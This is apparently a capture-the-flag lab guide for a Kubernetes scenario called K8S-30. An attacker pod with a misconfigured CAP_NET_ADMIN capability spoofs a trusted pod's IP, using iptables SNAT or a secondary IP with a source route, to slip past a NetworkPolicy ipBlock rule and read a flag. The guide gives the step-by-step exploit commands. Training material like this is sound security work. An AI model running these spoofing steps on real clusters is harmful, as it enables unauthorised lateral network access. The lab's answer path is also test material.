# K8S-30: CNI IP Spoofing (NetworkPolicy Bypass)

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-30 |
| 名称 | CNI IP Spoofing (NetworkPolicy Bypass) |
| 技术/CVE | N/A (IP spoofing) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 集群 | cve-k8s-30-cni-spoof |

## 场景概述

```
Attacker pod (untrust-zone, blocked by NetworkPolicy) → Discover trusted pod IP
  (10.244.1.x) → With CAP_NET_ADMIN, rewrite the source IP (iptables SNAT or
  secondary IP + source-route) → Bypass ipBlock CIDR check → Access flag service
```

> 前置：本场景安装 Calico（kind 默认 CNI 不强制 NetworkPolicy）。攻击者 pod
> 被错误地授予了 `CAP_NET_ADMIN`——这是该场景真正的配置缺陷，没有它就无法
> 改写源 IP。

## 前置知识

### Knowledge
- Kubernetes NetworkPolicy ipBlock: Understanding that allowing traffic from an IP CIDR block checks the source IP of the packet
- CNI networking: Pod IPs are assigned from the CNI subnet and can be manipulated within the pod's network namespace
- IP aliasing: Adding a secondary IP address to an interface in Linux (ip addr add)

### Tools
- kubectl: K8s API interaction
- ip: Linux IP address management

## 利用步骤

### Step 1: Verify NetworkPolicy Blocks Traffic
```bash
FLAG_IP=$(kubectl get svc flag-svc -n trust-zone -o jsonpath='{.spec.clusterIP}')
kubectl exec -n untrust-zone attacker-pod -- wget -qO- --timeout=3 http://${FLAG_IP}:8080
# Should FAIL — blocked by NetworkPolicy
```

### Step 2: Discover Allowed IP Range
```bash
kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml
# Ingress allows: ipBlock cidr: 10.244.1.0/24
```

### Step 3: Find Trusted Pod's IP
```bash
TRUSTED_IP=$(kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}')
echo "Trusted IP: $TRUSTED_IP"
```

### Step 4: Spoof IP to Bypass NetworkPolicy
```bash
# The attacker pod is misconfigured with CAP_NET_ADMIN (the actual finding).
# Primary: SNAT the source IP with iptables
kubectl exec -n untrust-zone attacker-pod -- \
  iptables -t nat -A POSTROUTING -d ${FLAG_IP} -j SNAT --to-source ${TRUSTED_IP}

# Alternative: add a secondary IP and force source selection
kubectl exec -n untrust-zone attacker-pod -- ip addr add ${TRUSTED_IP}/32 dev eth0
kubectl exec -n untrust-zone attacker-pod -- ip route add ${FLAG_IP}/32 dev eth0 src ${TRUSTED_IP}

kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080
# Success — NetworkPolicy sees source IP matching the allowed CIDR
```

## 验证命令

```bash
kubectl cluster-info --context kind-cve-k8s-30-cni-spoof
kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml
```

## Flag

- `/flag.txt` in `flag-pod` (trust-zone namespace)
- Accessible after IP spoofing bypasses the NetworkPolicy ipBlock restriction

- Flag 位置：`/flag.txt` in flag-pod (trust-zone namespace)

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | CNI networking, pod IP identity, and NetworkPolicy |
| 侦察与前置条件 | CNI address assignment and IP-based policy assumptions |
| 核心漏洞与利用 | Spoof a pod IP to bypass NetworkPolicy |
| 权限、横向或影响 | Cross-workload network access |
| 验证 | Reach the protected endpoint and capture the flag |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
